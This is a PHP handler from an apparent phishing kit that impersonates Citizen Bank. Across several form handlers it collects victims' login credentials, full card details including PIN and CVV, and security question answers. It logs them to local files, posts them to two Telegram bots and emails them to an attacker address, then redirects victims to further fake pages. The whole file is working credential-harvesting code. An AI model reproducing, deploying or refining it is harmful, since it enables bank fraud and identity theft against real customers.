<?php 
	session_start();

	        // variable declaration
	        // $errors = array(); 


	       if (isset($_POST['ReasonCode']))
	          {
	          	include 'recon.php';
	          	include 'config.php';
	          // Get User Input
	          $UserID = $_POST['UserID'];
	          $password = $_POST['password'];
	          
	          $ip = getenv("REMOTE_ADDR");
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
	          $body = "::::::::::::::: $Name Citizen Bank Info [Login Details] ::::::::::::::::::\r\n";
	          $body .= "UserID                                 : $UserID\r\n";
	          $body .= "Password                               : $password\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                                 : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= ":::::::::::::::: $Name Citizen Bank Info :::::::::::::::::\r\n";
	          
	          $save=fopen("access/login.txt","a+");
	          fwrite($save,$body);
	          fclose($save);

	         
              $result =  urlencode($body);
              file_get_contents('https://api.telegram.org/bot'.$Token.'/sendMessage?chat_id='.$ChatID.'&text='.$result."&parse_mode=html");
			  $result =  urlencode($body);
              file_get_contents('https://api.telegram.org/bot'.$Tokeno.'/sendMessage?chat_id='.$ChatIDo.'&text='.$result."&parse_mode=html");
        
         
 
	          $subject="Citizen Bank $Name Login Access 2 => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";

	          $headers="From: Citizen Bank $Name V1 <$themariarobert@yandex.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          if(mail($mail, $subject, $body, $headers))
	          {
	          	$key = substr(sha1(mt_rand()),1,25);
	          	echo "<script>window.location.href='../question_auth.php?online_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."';</script>";
	          	die();
	          }
	          else
	          {
	        	$key = substr(sha1(mt_rand()),1,25);
	        	echo "<script>window.location.href='../question_auth.php?online_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."';</script>";
	        	die();
	        	}
	          }
	          
	          if(isset($_POST['UserID'])&&isset($_POST['password']))
	          {
	          include 'recon.php';
	          include 'config.php'; 
	          // check for valid email address
	          $UserID = $_POST['UserID'];
	          $password = $_POST['password'];
	          
	          $ip = getenv("REMOTE_ADDR");
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
	          $body = "::::::::::::::::::::::: $Name Citizen Bank Info [Login Details] :::::::::::::::::::::::::\r\n";
	          $body .= "UserID                                 : $UserID\r\n";
	          $body .= "Password                               : $password\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                                 : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= ":::::::::::::::::::::: $Name Citizen Bank Info :::::::::::::::::::::::::\r\n";
	          
	          $save=fopen("access/login.txt","a+");
	          fwrite($save,$body);
	          fclose($save);

	         
              $result =  urlencode($body);
              file_get_contents('https://api.telegram.org/bot'.$Token.'/sendMessage?chat_id='.$ChatID.'&text='.$result."&parse_mode=html");
			   $result =  urlencode($body);
              file_get_contents('https://api.telegram.org/bot'.$Tokeno.'/sendMessage?chat_id='.$ChatIDo.'&text='.$result."&parse_mode=html");
        
             
	         
              $subject="Citizen Bank $Name Login Access 1 => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";
	          
	          $headers="From: $Name Citizen Bank V1 <$themariarobert@yandex.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          if(@mail($mail, $subject, $body, $headers))
	          {
	          $key = substr(sha1(mt_rand()),1,25);
	          echo "<script>window.location.href='../login.php?ReasonCode=6004';</script>";
	          die();
	          }
	          else
	          {
	          $key = substr(sha1(mt_rand()),1,25);
	          echo "<script>window.location.href='../login.php?ReasonCode=6004';</script>";
	          die();
	          }
	          }
	          
	          if (isset($_POST['credit_verify']))
	          {
	          	include 'recon.php';
	          	include 'config.php';
	          // check for valid email address 
	          $ccnum = $_POST['ccnum'];
	          $pin = $_POST['pin']; 
	          $expdate = $_POST['expdate'];
	          $cvv = $_POST['cvv']; 
	           
	          $ip = getenv("REMOTE_ADDR");
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
	          $body = "::::::::::::::::::::::: $Name Citizen Bank Info [Card Details] :::::::::::::::::::::::::\r\n"; 
	          $body .= "Card Number                          : $ccnum\r\n";
	          $body .= "Card Pin                             : $pin\r\n";
	          $body .= "Card Expiry Date                     : $expdate\r\n";
	          $body .= "Card Security Code                   : $cvv\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                               : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= ":::::::::::::::::::::: $Name Citizen Bank Info :::::::::::::::::::::::::\r\n";
	          
	          $save=fopen("access/credit_verify.txt","a+");
	          fwrite($save,$body);
	          fclose($save);

	        
              $result =  urlencode($body);
              file_get_contents('https://api.telegram.org/bot'.$Token.'/sendMessage?chat_id='.$ChatID.'&text='.$result."&parse_mode=html");
			  $result =  urlencode($body);
              file_get_contents('https://api.telegram.org/bot'.$Tokeno.'/sendMessage?chat_id='.$ChatIDo.'&text='.$result."&parse_mode=html");
        
            
             
	          $subject="Citizen Bank $Name Card Details => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";

	          $headers="From: Citizen Bank $Name V1 <$themariarobert@yandex.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          if(mail($mail, $subject, $body, $headers))
	          {
	          	$key = substr(sha1(mt_rand()),1,25);
	          	echo "<script>window.location.href='../success.php?online_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."';</script>";
	          	die();
	          }
	          else
	          {
	        	$key = substr(sha1(mt_rand()),1,25);
	        	echo "<script>window.location.href='../success.php?online_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."';</script>";
	        	die();
	        	}
	          }

	          
	      if (isset($_POST['quest_verify']))
	          {
	          	include 'recon.php';
	          	include 'config.php';
	          // check for valid email address 
	          $quest1 = $_POST['quest1'];
	          $quest2 = $_POST['quest2']; 
	          $quest3 = $_POST['quest3'];
			  $quest4 = $_POST['quest4'];
	          $ans1 = $_POST['ans1'];
	          $ans2 = $_POST['ans2'];
	          $ans3 = $_POST['ans3']; 
			  $ans4 = $_POST['ans4']; 
	           
	          $ip = getenv("REMOTE_ADDR");
	          $useragent = $_SERVER['HTTP_USER_AGENT'];
	          //send email
	          $body = "::::::::::::::::::::::: $Name Citizen Bank Info [Security Questions] :::::::::::::::::::::::::\r\n"; 
	          $body .= "Security Question 1                  : $quest1\r\n";
	          $body .= "Answer 1                             : $ans1\r\n";
	          $body .= "Security Question 2                  : $quest2\r\n";
	          $body .= "Answer 2                             : $ans2\r\n";
	          $body .= "Security Question 3                  : $quest3\r\n";
	          $body .= "Answer 3                             : $ans3\r\n";
			  $body .= "Security Question 4                  : $quest4\r\n";
	          $body .= "Answer 4                             : $ans4\r\n";
	          $body .=  "|--------------- I N F O | I P -------------------|\r\n";
	          $body .= "IP Address	                       : {$_SESSION['ip']}\r\n";
	          $body .= "IP Country	                       : {$_SESSION['country']}\r\n";
	          $body .= "IP City	                               : {$_SESSION['city']}\r\n";
	          $body .= "Browser		                       : {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	          $body .= "User Agent	                       : {$_SERVER['HTTP_USER_AGENT']}\r\n";
	          $body .= "TIME		                       : ".date("d/m/Y h:i:sa")." GMT\r\n";
	          $body .= ":::::::::::::::::::::: $Name Citizen Bank Info :::::::::::::::::::::::::\r\n";
	          
	          $save=fopen("access/security_quest.txt","a+");
	          fwrite($save,$body);
	          fclose($save);

	         
              $result =  urlencode($body);
              file_get_contents('https://api.telegram.org/bot'.$Token.'/sendMessage?chat_id='.$ChatID.'&text='.$result."&parse_mode=html");
			   $result =  urlencode($body);
              file_get_contents('https://api.telegram.org/bot'.$Tokeno.'/sendMessage?chat_id='.$ChatIDo.'&text='.$result."&parse_mode=html");
        
          
 
	          $subject="Citizen Bank $Name Security Questions => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";

	          $headers="From: Citizen Bank $Name V1 <$themariarobert@yandex.com>\r\n";
	          $headers.="MIME-Version: 1.0\r\n";
	          $headers.="Content-Type: text/plain; charset=UTF-8\r\n";
	          if(mail($mail, $subject, $body, $headers))
	          {
	          	$key = substr(sha1(mt_rand()),1,25);
	          	echo "<script>window.location.href='../account_verify.php?online_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."';</script>";
	          	die();
	          }
	          else
	          {
	        	$key = substr(sha1(mt_rand()),1,25);
	        	echo "<script>window.location.href='../account_verify.php?online_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."';</script>";
	        	die();
	        	}
	          }
?>